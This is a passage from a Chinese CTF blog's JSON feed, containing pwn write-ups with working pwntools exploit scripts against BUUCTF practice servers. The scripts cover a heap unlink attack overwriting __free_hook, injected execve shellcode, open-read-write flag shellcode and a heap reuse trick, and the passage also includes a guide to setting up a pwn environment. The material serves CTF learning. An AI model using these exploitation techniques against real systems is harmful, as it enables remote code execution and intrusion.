punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span>\nbase <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x7fcd46b5f830\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x116a</span>\nlog<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token string\">\"base: \"</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nnote_addr <span class=\"token operator\">=</span> arry <span class=\"token operator\">=</span> <span class=\"token number\">0x202060</span> <span class=\"token operator\">+</span> base\nfree_hook <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"__free_hook\"</span><span class=\"token punctuation\">]</span>\nsystem_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span>\n\nlog<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token string\">\"note_addr: \"</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>note_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x98</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/bin/sh\\x00\\n'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#unlink</span>\npayload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>note_addr<span class=\"token operator\">-</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>note_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x70</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\xa0\"</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#getshell</span>\npayload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>free_hook<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>payload<span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#dbg()</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span> <span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<hr class=\"footnotes-sep\">\n<section class=\"footnotes\">\n<ol class=\"footnotes-list\">\n<li id=\"fn1\" class=\"footnote-item\"><p><a href=\"https://blog.csdn.net/qq_41202237/article/details/108481889\">一篇博客弄懂 Unlink</a> <a href=\"#fnref1\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n</ol>\n</section>\n",
            "tags": [
                "PWN",
                "格式化字符串",
                "堆",
                "BUUCTF",
                "unlink"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/shellcode%E4%BE%8B%E9%A2%98/",
            "url": "http://niyah.cn/CTF/shellcode%E4%BE%8B%E9%A2%98/",
            "title": "shellcode例题",
            "date_published": "2021-03-28T06:10:27.000Z",
            "content_html": "<p>一直不是很会的一个点</p>\n<a id=\"more\"></a>\n<h2 id=\"b0verfl0w\"><a class=\"markdownIt-Anchor\" href=\"#b0verfl0w\">#</a> b0verfl0w</h2>\n<p>自己构造一下汇编指令</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#coding=utf-8</span>\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ncontext<span class=\"token punctuation\">.</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span>\np<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"29624\"</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\xb0\\x0b\\xcd\\x80\"</span>\n\ngad_get <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''\nsub esp,0x28;\ncall esp\n'''</span>\ngad_get <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>gad_get<span class=\"token punctuation\">)</span>\njmp_esp<span class=\"token operator\">=</span><span class=\"token number\">0x08048504</span>\npayload<span class=\"token operator\">=</span>shellcode<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"bbbb\"</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>jmp_esp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>gad_get\n\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"your name?\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h2 id=\"orw\"><a class=\"markdownIt-Anchor\" href=\"#orw\">#</a> orw</h2>\n<p>open read write shellcode</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node3.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25346</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/flag'</span><span class=\"token punctuation\">)</span>\nshellcode <span class=\"token operator\">+=</span> shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'esp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\nshellcode <span class=\"token operator\">+=</span> shellcraft<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'esp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'shellcode:'</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h2 id=\"picoctf_2018_shellcode\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_shellcode\">#</a> PicoCTF_2018_shellcode</h2>\n<p>程序自己直接会执行输入的 shellcode</p>\n<center><img src=\"/CTF/shellcode%E4%BE%8B%E9%A2%98/ez.png\"></center>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\np<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node3.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28126</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "BUUCTF",
                "shellcode"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/",
            "url": "http://niyah.cn/CTF/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/",
            "title": "虚拟机pwn环境配置",
            "date_published": "2021-02-28T06:10:27.000Z",
            "content_html": "<blockquote>\n<p>为防止自己犯病写的虚拟机 pwn 环境配置，大概适用 16.04-18.04</p>\n<p>ubuntu18.04 升级到 ubuntu20.04 千万不要选择删除旧软件😅😅😅😅</p>\n<p>来源于网上各种教程</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"基本环境\"><a class=\"markdownIt-Anchor\" href=\"#基本环境\">#</a> 基本环境</h1>\n<h2 id=\"更换国内源\"><a class=\"markdownIt-Anchor\" href=\"#更换国内源\">#</a> 更换国内源</h2>\n<ul>\n<li>备份原来的源（一定要备份）</li>\n</ul>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">sudo cp &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources_init.list</code></pre>\n<ul>\n<li>更换源</li>\n</ul>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">sudo gedit &#x2F;etc&#x2F;apt&#x2F;sources.list</code></pre>\n<ul>\n<li>将下列代码复制进去</li>\n</ul>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">#  阿里源\ndeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse\ndeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse\ndeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse\ndeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse\ndeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse\ndeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiverse\ndeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiverse\ndeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiverse\ndeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse\ndeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse</code></pre>\n<ul>\n<li>更新，修复</li>\n</ul>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">sudo apt-get update\nsudo apt-get upgrade\nsudo apt-get install build-essential</code></pre>\n<h2 id=\"安装python2\"><a class=\"markdownIt-Anchor\" href=\"#安装python2\">#</a> 安装 Python2</h2>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">sudo apt install python2.7</code></pre>\n<h2 id=\"安装zsh\"><a class=\"markdownIt-Anchor\" href=\"#安装zsh\">#</a> 安装 zsh</h2>\n<ul>\n<li>安装 git</li>\n</ul>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">sudo apt-get install git</code></pre>\n<ul>\n<li>安装 zsh</li>\n</ul>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">sudo apt-get install zsh</code></pre>\n<ul>\n<li>安装 on-my-zsh</li>\n</ul>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">wget https:&#x2F;&#x2F;gitee.com&#x2F;mirrors&#x2F;oh-my-zsh&#x2F;raw&#x2F;master&#x2F;tools&#x2F;install.sh\n\nchmod +x install.sh\n\n.&#x2F;install.sh</code></pre>\n<ul>\n<li>配置 zsh</li>\n</ul>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">ZSH_THEME&#x3D;&quot;ys&quot;\nplugins&#x3D;(git zsh-syntax-highlighting zsh-autosuggestions)</code></pre>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">source .zshrc</code></pre>\n<ul>\n<li>安装插件</li>\n</ul>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">git clone https:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~&#x2F;.oh-my-zsh&#x2F;custom&#125;&#x2F;plugins&#x2F;zsh-syntax-highlighting\n\ngit clone https:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-autosuggestions $&#123;ZSH_CUSTOM:-~&#x2F;.oh-my-zsh&#x2F;custom&#125;&#x2F;plugins&#x2F;zsh-autosuggestions</code></pre>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">source .zshrc</code></pre>\n<ul>\n<li>安装 powerline 字体</li>\n</ul>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">git clone https:&#x2F;&#x2F;github.com&#x2F;powerline&#x2F;fonts</code></pre>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">.&#x2F;install.sh</code></pre>\n<ul>\n<li>切换默认终端</li>\n</ul>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">chsh -s &#x2F;usr&#x2F;bin&#x2F;zsh</code></pre>\n<h1 id=\"pwn环境\"><a class=\"markdownIt-Anchor\" href=\"#pwn环境\">#</a> Pwn 环境</h1>\n<h2 id=\"执行一键安装脚本\"><a class=\"markdownIt-Anchor\" href=\"#执行一键安装脚本\">#</a> 执行一键安装脚本</h2>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;giantbranch&#x2F;pwn-env-init&#x2F;master&#x2F;pwn_init_py2.sh\nchmod +x pwn_init_py2.sh\nsudo .&#x2F;pwn_init_py2.sh</code></pre>\n<h2 id=\"安装libcsearcher\"><a class=\"markdownIt-Anchor\" href=\"#安装libcsearcher\">#</a> 安装 LibcSearcher</h2>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git\ncd LibcSearcher\nsudo python setup.py develop</code></pre>\n<h2 id=\"安装pwndbg-pwngdb\"><a class=\"markdownIt-Anchor\" href=\"#安装pwndbg-pwngdb\">#</a> 安装 Pwndbg、Pwngdb</h2>\n<ul>\n<li>安装 pwndbg、pwngdb</li>\n</ul>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg\ngit clone https:&#x2F;&#x2F;github.com&#x2F;scwuaptx&#x2F;Pwngdb.git \ncd pwndbg\nsudo .&#x2F;setup.sh</code></pre>\n<ul>\n<li>切换 gdb 默认插件</li>\n</ul>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">cd ~\ncp ~&#x2F;Pwngdb&#x2F;.gdbinit ~&#x2F;\ngedit ~&#x2F;.gdbinit</code></pre>\n<pre class=\"language-sh\" data-language=\"sh\"><code class=\"language-sh\">source ~&#x2F;pwndbg&#x2F;gdbinit.py\nsource ~&#x2F;Pwngdb&#x2F;pwngdb.py\nsource ~&#x2F;Pwngdb&#x2F;angelheap&#x2F;gdbinit.py</code></pre>\n",
            "tags": [
                "CTF",
                "PWN"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/",
            "url": "http://niyah.cn/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/",
            "title": "堆溢出",
            "date_published": "2021-02-26T06:10:27.000Z",
            "content_html": "<blockquote>\n<p>堆溢出，最最最简单</p>\n</blockquote>\n<a id=\"more\"></a>\n<h2 id=\"summoner\"><a class=\"markdownIt-Anchor\" href=\"#summoner\">#</a> Summoner</h2>\n<h3 id=\"热知识\"><a class=\"markdownIt-Anchor\" href=\"#热知识\">#</a> 热知识</h3>\n<blockquote>\n<p>​\t在做这道题目之前，我们首先需要了解一些堆的基本概念，堆不同于栈，栈在程序运行时会自己出现，堆是动态分配的 (由操作系统内核或者堆管理器)，只有在程序中需要时才会分配。在 CTF 的 pwn 中，栈是程序加载进内存后就会出现，而堆是由<kbd>malloc</kbd>、<kbd>alloc</kbd>、<kbd>realloc </kbd>函数分配内存后才会出现。</p>\n</blockquote>\n<p>​\t以 64 位程序为例子，在用户申请堆块后，系统便会给用户划分一块内存 (chunk) 供用户使用，这块内存通常如下图所示，这是用户在使用中的情况。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">如下</th>\n<th style=\"text-align:center\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">pre size</td>\n<td style=\"text-align:center\">size</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">用户数据</td>\n<td style=\"text-align:center\">用户数据</td>\n</tr>\n</tbody>\n</table>\n<p>​\t可以看到 chunk 的大小并不等于用户申请的大小，而是比用户申请的大 0x10 个字节，这多出来的部分通产用来存放 chunk 的信息。</p>\n<blockquote>\n<p>size 位 ：这里存放的是当前 chunk 的大小 (包括 chunk 头)，而我们知道，64 位程序通常以 8 字节对齐，在一般情况下，chunk 的大小都是 0x8 的整数倍，而 1 字节由八个 bit 组成，以 0x8 为最小单位则低三位恒为零，所以这三位存放的是 chunk 的状态。</p>\n<blockquote>\n<p>0 0 0 0 1 0 0 0    =   0x8</p>\n</blockquote>\n<p>目前我们只需要要知道最低位 PREV_INUSE ，它记录前一个 (物理距离) chunk 是否被使用。</p>\n<p>pre size 位 ：这个位置比较灵活，在 PREV_INUSE 为 1 时，可以被上一个块使用，在 PREV_INUSE 为 0 时，记录上一个块的大小。</p>\n</blockquote>\n<p>​\t所以当我们执行 malloc (0x10) 时，得到的大小通常是 0x21。</p>\n<p>​\t<kbd>malloc</kbd>函数返回的是一个指向用户数据段的一个指针，我们可以通过<kbd>free</kbd>函数释放这个指针，在我们执行 free 操作释放指针后，chunk 会发生一些改变并根据一定的规则放入 bin 中，其中便有 fast bin、unsorted bin、small bin、large bin，fast bin 为单向链表，其他的都是双向链表，0x20 大小的 chunk 被释放后如下</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">如下</th>\n<th style=\"text-align:center\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">pre size</td>\n<td style=\"text-align:center\">size</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">fd</td>\n<td style=\"text-align:center\">用户数据</td>\n</tr>\n</tbody>\n</table>\n<p>​\t一般小于等于 0x80 大小的 chunk 被 free 掉之后会被放入相应大小的 fast bin 中，当用户再次申请相应大小的块时，系统会在 fast bin 中把那个块从链表末尾捡回来，既然是单向链表，则新增加的 fd 位自然是指向上个 chunk 的 pre size 地址</p>\n<h3 id=\"开始做题\"><a class=\"markdownIt-Anchor\" href=\"#开始做题\">#</a> 开始做题</h3>\n<p>​\t拿到题目进行分析，发现保护全开，这在堆题目里其实是很常见的</p>\n<center><img src=\"/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-1.png\"></center>\n<p>​\t先不慌我们先运行一下</p>\n<center><img src=\"/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-2.png\"></center>\n<p>​\t根据题目描述大概是，让我们想办法召唤一只 level5 的怪兽和对面召唤的 level5 的怪兽撞过去</p>\n<blockquote>\n<p>​\t题目提供了几种命令：</p>\n<ul>\n<li>展示召唤物信息</li>\n<li>召唤一只生物，并给它起名字</li>\n<li>设置生物的等级，但必须小于 5</li>\n<li>攻击敌方召唤物</li>\n<li>释放召唤物</li>\n</ul>\n</blockquote>\n<p>​\t在 IDA 分析过后可以发现还是有点问题的，首先是<kbd>strdup</kbd>函数，其返回一个指针，指向为复制字符串分配的空间，这个空间的大小是由我们决定的，其次是释放命令，它在使用后仅仅是把指针清空，并没有将我们用户的数据进行清空</p>\n<p>​\t接下来我们构造脚本进行攻击，我们在进行召唤一个怪兽和升四级之后，他们的堆块变成了这个样子</p>\n<blockquote>\n<p>summor aaa</p>\n<p>level-up 4</p>\n</blockquote>\n<center><img src=\"/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-3.png\"></center>\n<p>​\t我们可以看见 2 号箭头指向的 616161 就是怪兽的名字 aaa，1 号箭头指向的为怪兽等级 4，3 号箭头指向了怪兽名字的地址，在这个时候，我们也就对这个召唤物的成分有了一些认识</p>\n<p>​\t首先，在进行召唤过后，系统会自动 malloc 一个 chunk，其大小为 0x10，他的前 0x8 字节存放怪兽名字的地址，后 0x8 字节存放怪兽的等级，之后解放掉这只怪兽</p>\n<center><img src=\"/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-4.png\"></center>\n<p>​\t存放解放怪兽姓名的 chunk 会被 free 掉进入 bin 中</p>\n<center><img src=\"/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-5.png\"></center>\n<p>​\t当我们再次召唤时，便会将以收入 bin 中的 0x20 大小的块捡回来使用，而最开始输入的姓名不限长度，用户数据又不会清空，那么我们大可以把前一个 0x8 字节填满，溢出到下一个 0x8 字节，所以我们只需在最初召唤时溢出一个字节来存放等级，解放掉，再次申请回来时，那个块的前 0x8 个字节依然存放姓名指针，而后 0x8 个字节便是我们残留的等级</p>\n<center><img src=\"/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-6.png\"></center>\n<p>​\t再次召唤后进行攻击就能 getshell 了</p>\n<center><img src=\"/CTF/%E5%A0%86%E6%BA%A2%E5%87%BA/1-7.png\"></center>\n<p>​\t脚本十分简单</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\n<span class=\"token comment\">#p =process(\"./summoner\")</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">25153</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">new</span><span class=\"token punctuation\">(</span> name <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"summon \"</span><span class=\"token operator\">+</span> name<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"show\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">up</span><span class=\"token punctuation\">(</span> l <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"level-up \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"release\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\nnew<span class=\"token punctuation\">(</span><span class=\"token string\">\"aaaaaaaa\"</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nnew<span class=\"token punctuation\">(</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"strike\"</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "堆",
                "BUUCTF"
            ]
        }
    ]
}